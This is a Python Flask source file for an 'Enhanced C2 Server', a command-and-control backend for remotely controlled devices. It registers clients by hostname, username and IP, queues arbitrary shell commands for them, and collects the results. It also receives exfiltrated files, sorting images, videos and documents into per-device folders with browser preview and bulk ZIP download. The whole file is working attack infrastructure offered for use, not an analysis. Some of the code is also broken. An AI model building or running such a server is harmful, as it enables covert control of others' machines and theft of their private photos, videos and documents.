#!/usr/bin/env python3
"""
Enhanced C2 Server - Organized File Downloads by Device
"""
from flask import Flask, request, jsonify, send_file, send_from_directory
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import shutil
from datetime import datetime
import mimetypes

app = Flask(__name__)
CORS(app)

# Configuration
DATABASE = 'enhanced_c2.db'
ONLINE_THRESHOLD = 180
UPLOAD_FOLDER = 'uploads'
DOWNLOAD_FOLDER = 'downloads'

# Create directories
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT DEFAULT 'online',
            download_folder TEXT,
            created_at REAL
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            output TEXT,
            created_at REAL,
            executed_at REAL
        )
    ''')
    
    # Files table with device tracking
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filetype TEXT,
            filesize INTEGER,
            uploaded_at REAL,
            downloaded INTEGER DEFAULT 0,
            download_path TEXT,
            device_folder TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def get_device_folder(client_id, hostname):
    """Get or create device-specific download folder"""
    # Create safe folder name from hostname
    safe_name = "".join(c for c in hostname if c.isalnum() or c in (' ', '-', '_')).rstrip()
    if not safe_name:
        safe_name = f"device_{client_id[:8]}"
    
    device_folder = os.path.join(DOWNLOAD_FOLDER, safe_name)
    os.makedirs(device_folder, exist_ok=True)
    
    return device_folder, safe_name

# === CLIENT ENDPOINTS ===

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client checkin"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        hostname = data.get('hostname', 'unknown')
        
        # Get device folder
        device_folder, folder_name = get_device_folder(client_id, hostname)
        
        # Check if client exists
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing = cursor.fetchone()
        
        if existing:
            # Update existing client
            cursor.execute('''
                UPDATE clients 
                SET last_seen = ?, status = 'online',
                    hostname = COALESCE(?, hostname),
                    username = COALESCE(?, username),
                    os = COALESCE(?, os),
                    download_folder = ?
                WHERE id = ?
            ''', (current_time, 
                  hostname,
                  data.get('username'),
                  data.get('os'),
                  device_folder,
                  client_id))
        else:
            # Insert new client
            cursor.execute('''
                INSERT INTO clients 
                (id, hostname, username, os, ip, last_seen, status, download_folder, created_at)
                VALUES (?, ?, ?, ?, ?, ?, 'online', ?, ?)
            ''', (client_id,
                  hostname,
                  data.get('username', 'unknown'),
                  data.get('os', 'unknown'),
                  request.remote_addr,
                  current_time,
                  device_folder,
                  current_time))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Checkin: {client_id} ({hostname}) -> Folder: {folder_name}")
        
        return jsonify({
            'status': 'ok',
            'timestamp': current_time,
            'device_folder': folder_name
        }), 200
        
    except Exception as e:
        print(f"[✗] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        cmd_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (cmd_id, client_id, command, time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Command: {cmd_id[:8]} -> {client_id}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        print(f"[✗] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Update client's last_seen
        cursor.execute('UPDATE clients SET last_seen = ? WHERE id = ?', 
                      (time.time(), client_id))
        
        # Get pending commands
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 10
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Mark as sent
        if commands:
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?' for _ in cmd_ids])
            cursor.execute(f'''
                UPDATE commands SET status = 'sent'
                WHERE id IN ({placeholders})
            ''', cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Submit command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, executed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Result: {cmd_id[:8]} -> {len(output)} chars")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    """Get command result"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'status': row['status'],
                'output': row['output'] or '',
                'command': row['command']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found'
            }), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === ENHANCED FILE UPLOAD WITH ORGANIZATION ===

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client - Organized by device"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client_id'}), 400
        
        # Get client info
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT hostname, download_folder FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        hostname = client['hostname']
        device_folder = client['download_folder']
        
        # Determine file type
        filename = file.filename.lower()
        if filename.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
            filetype = 'image'
            subfolder = 'images'
        elif filename.endswith(('.mp4', '.avi', '.mov', '.mkv', '.webm', '.flv', '.wmv')):
            filetype = 'video'
            subfolder = 'videos'
        elif filename.endswith(('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx')):
            filetype = 'document'
            subfolder = 'documents'
        else:
            filetype = 'other'
            subfolder = 'other'
        
        # Create organized folder structure
        organized_folder = os.path.join(device_folder, subfolder)
        os.makedirs(organized_folder, exist_ok=True)
        
        # Generate safe filename with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_filename = f"{timestamp}_{file.filename}"
        filepath = os.path.join(organized_folder, safe_filename)
        
        # Save file
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Save to database
        file_id = str(uuid.uuid4())
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filetype, filesize, 
                             uploaded_at, device_folder)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (file_id, client_id, file.filename, filepath, filetype, 
              filesize, time.time(), hostname))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Upload: {client_id} -> {file.filename} ({filetype}) -> {subfolder}/")
        
        return jsonify({
            'success': True,
            'file_id': file_id,
            'filename': file.filename,
            'filetype': filetype,
            'size': filesize,
            'device_folder': hostname,
            'organized_path': f"{hostname}/{subfolder}/{safe_filename}"
        }), 200
        
    except Exception as e:
        print(f"[✗] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/<client_id>', methods=['GET'])
def list_files(client_id):
    """List files for client with organization info"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, filename, filetype, filesize, uploaded_at, downloaded, 
                   device_folder, download_path
            FROM files 
            WHERE client_id = ?
            ORDER BY uploaded_at DESC
            LIMIT 100
        ''', (client_id,))
        
        files = []
        for row in cursor.fetchall():
            # Get relative path for display
            rel_path = ""
            if row['filepath']:
                rel_path = os.path.relpath(row['filepath'], DOWNLOAD_FOLDER)
            
            files.append({
                'id': row['id'],
                'filename': row['filename'],
                'filetype': row['filetype'],
                'size': row['filesize'],
                'uploaded_at': row['uploaded_at'],
                'downloaded': bool(row['downloaded']),
                'device_folder': row['device_folder'],
                'relative_path': rel_path,
                'download_path': row['download_path'],
                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S'),
                'date_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d'),
                'size_str': f"{row['filesize'] / 1024 / 1024:.2f} MB" if row['filesize'] > 1024*1024 else f"{row['filesize'] / 1024:.1f} KB"
            })
        
        conn.close()
        return jsonify({'files': files}), 200
        
    except Exception as e:
        return jsonify({'files': []}), 500

@app.route('/api/files/all', methods=['GET'])
def list_all_files():
    """List all files from all devices"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT f.*, c.hostname, c.username 
            FROM files f
            LEFT JOIN clients c ON f.client_id = c.id
            ORDER BY f.uploaded_at DESC
            LIMIT 200
        ''')
        
        files = []
        for row in cursor.fetchall():
            files.append({
                'id': row['id'],
                'filename': row['filename'],
                'filetype': row['filetype'],
                'size': row['filesize'],
                'uploaded_at': row['uploaded_at'],
                'client_id': row['client_id'],
                'hostname': row['hostname'] or 'unknown',
                'username': row['username'] or 'unknown',
                'device_folder': row['device_folder'],
                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S'),
                'date_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d'),
                'size_str': f"{row['filesize'] / 1024 / 1024:.2f} MB" if row['filesize'] > 1024*1024 else f"{row['filesize'] / 1024:.1f} KB"
            })
        
        conn.close()
        return jsonify({'files': files}), 200
        
    except Exception as e:
        return jsonify({'files': []}), 500

@app.route('/api/file/download/<file_id>', methods=['GET'])
def download_file(file_id):
    """Download file - Updates download tracking"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT filepath, filename, client_id FROM files WHERE id = ?', (file_id,))
        row = cursor.fetchone()
        
        if not row or not os.path.exists(row['filepath']):
            conn.close()
            return jsonify({'error': 'File not found'}), 404
        
        # Mark as downloaded
        cursor.execute('''
            UPDATE files 
            SET downloaded = 1, download_path = ?
            WHERE id = ?
        ''', (row['filepath'], file_id))
        
        conn.commit()
        conn.close()
        
        print(f"[↓] Download: {file_id} -> {row['filename']}")
        
        return send_file(
            row['filepath'],
            as_attachment=True,
            download_name=row['filename']
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/file/preview/<file_id>', methods=['GET'])
def preview_file(file_id):
    """Preview file in browser (images/videos)"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT filepath, filename, filetype FROM files WHERE id = ?', (file_id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row or not os.path.exists(row['filepath']):
            return jsonify({'error': 'File not found'}), 404
        
        # Mark as downloaded
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('UPDATE files SET downloaded = 1 WHERE id = ?', (file_id,))
        conn.commit()
        conn.close()
        
        # Determine content type
        if row['filetype'] == 'image':
            mimetype = mimetypes.guess_type(row['filename'])[0] or 'image/jpeg'
        elif row['filetype'] == 'video':
            mimetype = 'video/mp4'
        else:
            mimetype = 'application/octet-stream'
        
        return send_file(
            row['filepath'],
            mimetype=mimetype
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/download/all/<client_id>', methods=['POST'])
def download_all_files(client_id):
    """Download all files from a device as ZIP"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Get client info
        cursor.execute('SELECT hostname FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Get all files for this client
        cursor.execute('SELECT filepath, filename FROM files WHERE client_id = ?', (client_id,))
        files = cursor.fetchall()
        conn.close()
        
        if not files:
            return jsonify({'error': 'No files found for this device'}), 404
        
        # Create temporary zip file
        import zipfile
        import tempfile
        
        hostname = client['hostname']
        zip_filename = f"{hostname}_files_{int(time.time())}.zip"
        zip_path = os.path.join(tempfile.gettempdir(), zip_filename)
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                if os.path.exists(file['filepath']):
                    # Add file to zip with relative path
                    arcname = os.path.join(hostname, file['filename'])
                    zipf.write(file['filepath'], arcname)
        
        # Mark all files as downloaded
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE files 
            SET downloaded = 1 
            WHERE client_id = ? AND downloaded = 0
        ''', (client_id,))
        conn.commit()
        conn.close()
        
        print(f"[📦] Downloaded all files from {hostname} as ZIP")
        
        return send_file(
            zip_path,
            as_attachment=True,
            download_name=zip_filename,
            mimetype='application/zip'
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/folders', methods=['GET'])
def list_device_folders():
    """List all device folders with statistics"""
    try:
        device_folders = []
        download_path = os.path.abspath(DOWNLOAD_FOLDER)
        
        if os.path.exists(download_path):
            for item in os.listdir(download_path):
                item_path = os.path.join(download_path, item)
                if os.path.isdir(item_path):
                    # Count files in subfolders
                    total_files = 0
                    total_size = 0
                    
                    for root, dirs, files in os.walk(item_path):
                        total_files += len(files)
                        for file in files:
                            file_path = os.path.join(root, file)
                            if os.path.exists(file_path):
                                total_size += os.path.getsize(file_path)
                    
                    device_folders.append({
                        'name': item,
                        'path': item_path,
                        'total_files': total_files,
                        'total_size': total_size,
                        'size_str': f"{total_size / 1024 / 1024:.2f} MB",
                        'folders': [d for d in os.listdir(item_path) if os.path.isdir(os.path.join(item_path, d))]
                    })
        
        return jsonify({'device_folders': device_folders}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/browse/<path:folder_path>', methods=['GET'])
def browse_folder(folder_path):
    """Browse folder contents"""
    try:
        # Security check - ensure path is within downloads
        full_path = os.path.join(DOWNLOAD_FOLDER, folder_path)
        if not os.path.abspath(full_path).startswith(os.path.abspath(DOWNLOAD_FOLDER)):
            return jsonify({'error': 'Access denied'}), 403
        
        if not os.path.exists(full_path):
            return jsonify({'error': 'Folder not found'}), 404
        
        contents = []
        for item in os.listdir(full_path):
            item_path = os.path.join(full_path, item)
            is_dir = os.path.isdir(item_path)
            
            item_info = {
                'name': item,
                'is_dir': is_dir,
                'path': os.path.join(folder_path, item)
            }
            
            if not is_dir:
                item_info['size'] = os.path.getsize(item_path)
                item_info['size_str'] = f"{os.path.getsize(item_path) / 1024 / 1024:.2f} MB"
                item_info['modified'] = os.path.getmtime(item_path)
            
            contents.append(item_info)
        
        return jsonify({
            'path': folder_path,
            'contents': contents
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === MANAGEMENT ENDPOINTS ===

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients with download info"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update status based on last_seen
        cursor.execute('''
            UPDATE clients 
            SET status = CASE 
                WHEN ? - last_seen > ? THEN 'offline'
                ELSE 'online'
            END
        ''', (current_time, ONLINE_THRESHOLD))
        
        conn.commit()
        
        # Get all clients with file counts
        cursor.execute('''
            SELECT c.*, 
                   COUNT(f.id) as total_files,
                   SUM(CASE WHEN f.downloaded = 1 THEN 1 ELSE 0 END) as downloaded_files,
                   SUM(CASE WHEN f.filetype = 'image' THEN 1 ELSE 0 END) as image_files,
                   SUM(CASE WHEN f.filetype = 'video' THEN 1 ELSE 0 END) as video_files
            FROM clients c
            LEFT JOIN files f ON c.id = f.client_id
            GROUP BY c.id
            ORDER BY c.last_seen DESC
        ''')
        
        clients = []
        for row in cursor.fetchall():
            time_diff = current_time - row['last_seen']
            
            if time_diff < 60:
                status_emoji = '🟢'
                status_text = 'online'
            elif time_diff < 300:
                status_emoji = '🟡'
                status_text = 'away'
            else:
                status_emoji = '🔴'
                status_text = 'offline'
            
            # Get download folder name
            download_folder = 'N/A'
            if row['download_folder']:
                download_folder = os.path.basename(row['download_folder'])
            
            clients.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'ip': row['ip'],
                'status': row['status'],
                'status_display': f"{status_emoji} {status_text}",
                'download_folder': download_folder,
                'total_files': row['total_files'] or 0,
                'downloaded_files': row['downloaded_files'] or 0,
                'image_files': row['image_files'] or 0,
                'video_files': row['video_files'] or 0,
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
                'created_at': row['created_at'],
                'created_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d')
            })
        
        conn.close()
        return jsonify({'clients': clients}), 200
        
    except Exception as e:
        print(f"[✗] Clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        current_time = time.time()
        
        # Counts
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        online_now = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files')
        total_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files WHERE filetype = "image"')
        image_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files WHERE filetype = "video"')
        video_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files WHERE downloaded = 1')
        downloaded_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(DISTINCT device_folder) FROM files')
        devices_with_files = cursor.fetchone()[0]
        
        # Total download size
        cursor.execute('SELECT SUM(filesize) FROM files')
        total_size = cursor.fetchone()[0] or 0
        
        conn.close()
        
        # Count device folders
        device_folders = []
        if os.path.exists(DOWNLOAD_FOLDER):
            device_folders = [d for d in os.listdir(DOWNLOAD_FOLDER) 
                            if os.path.isdir(os.path.join(DOWNLOAD_FOLDER, d))]
        
        return jsonify({
            'total_clients': total_clients,
            'online_now': online_now,
            'total_files': total_files,
            'image_files': image_files,
            'video_files': video_files,
            'downloaded_files': downloaded_files,
            'devices_with_files': devices_with_files,
            'device_folders': len(device_folders),
            'total_size': total_size,
            'total_size_str': f"{total_size / 1024 / 1024 / 1024:.2f} GB",
            'server_time': current_time,
            'server_uptime': current_time - app_start_time,
            'download_folder': os.path.abspath(DOWNLOAD_FOLDER)
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'version': '2.0',
        'features': ['organized_downloads', 'device_folders', 'file_preview']
    }), 200

@app.route('/')
def index():
    """Web interface"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Enhanced C2 Server - Organized Downloads</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                color: white;
            }
            .container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 30px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            }
            h1 {
                text-align: center;
                margin-bottom: 30px;
                font-size: 2.5em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            .feature-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            .feature-card {
                background: rgba(255, 255, 255, 0.15);
                border-radius: 15px;
                padding: 20px;
                text-align: center;
                transition: transform 0.3s;
            }
            .feature-card:hover {
                transform: translateY(-5px);
                background: rgba(255, 255, 255, 0.2);
            }
            .console-link {
                display: inline-block;
                background: white;
                color: #667eea;
                padding: 12px 24px;
                border-radius: 50px;
                text-decoration: none;
                font-weight: bold;
                margin-top: 20px;
                transition: all 0.3s;
            }
            .console-link:hover {
                background: #f8f9fa;
                transform: scale(1.05);
            }
            .download-path {
                background: rgba(0, 0, 0, 0.2);
                padding: 10px;
                border-radius: 5px;
                font-family: monospace;
                margin: 20px 0;
                word-break: break-all;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📁 Enhanced Device Control Server</h1>
            <p>Files are automatically organized in device folders:</p>
            
            <div class="download-path" id="download-path">Loading...</div>
            
            <div class="feature-grid">
                <div class="feature-card">
                    <h3>📂 Device Folders</h3>
                    <p>Each device has its own folder</p>
                    <p>Files organized by type</p>
                </div>
                <div class="feature-card">
                    <h3>🖼️ Image Gallery</h3>
                    <p>View images by device</p>
                    <p>Automatic thumbnails</p>
                </div>
                <div class="feature-card">
                    <h3>🎥 Video Library</h3>
                    <p>Organized video collection</p>
                    <p>Preview in browser</p>
                </div>
                <div class="feature-card">
                    <h3>📦 Bulk Download</h3>
                    <p>Download all files as ZIP</p>
                    <p>Organized by device</p>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 40px;">
                <a href="/api/device/folders" class="console-link" target="_blank">Browse Device Folders</a>
                <a href="/api/clients" class="console-link" style="margin-left: 15px;">View Clients</a>
            </div>
            
            <div style="margin-top: 40px; text-align: center; opacity: 0.8;">
                <p>Use the enhanced console for full control: <code>python enhanced_c2_console.py http://localhost:5000</code></p>
            </div>
        </div>
        
        <script>
            async function loadDownloadPath() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    document.getElementById('download-path').textContent = 
                        `Download Folder: ${data.download_folder}`;
                } catch (error) {
                    document.getElementById('download-path').textContent = 
                        'Error loading download path';
                }
            }
            
            loadDownloadPath();
        </script>
    </body>
    </html>
    '''

def cleanup():
    """Cleanup old data"""
    while True:
        time.sleep(300)
        try:
            conn = get_db()
            cursor = conn.cursor()
            current_time = time.time()
            
            # Remove old offline clients (7 days)
            cursor.execute('''
                DELETE FROM clients 
                WHERE status = 'offline' AND ? - last_seen > 604800
            ''', (current_time,))
            
            # Remove old files (90 days)
            cursor.execute('''
                DELETE FROM files 
                WHERE ? - uploaded_at > 7776000
            ''', (current_time,))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[✗] Cleanup error: {e}")

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start cleanup thread
    threading.Thread(target=cleanup, daemon=True).start()
    
    app_start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║           ENHANCED C2 SERVER v2.0                        ║
║           Organized Downloads by Device                  ║
╚══════════════════════════════════════════════════════════╝

    📊 Database: {DATABASE}
    📁 Downloads: {os.path.abspath(DOWNLOAD_FOLDER)}/
    📂 Uploads: {os.path.abspath(UPLOAD_FOLDER)}/
    
    🎯 Features:
    • 📂 Auto-organized device folders
    • 🖼️ Images → /device_name/images/
    • 🎥 Videos → /device_name/videos/
    • 📄 Documents → /device_name/documents/
    • 📦 Bulk download as ZIP
    • 👁️ File preview in browser
    
    🔗 Server: http://0.0.0.0:5000
    
    Starting server...
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
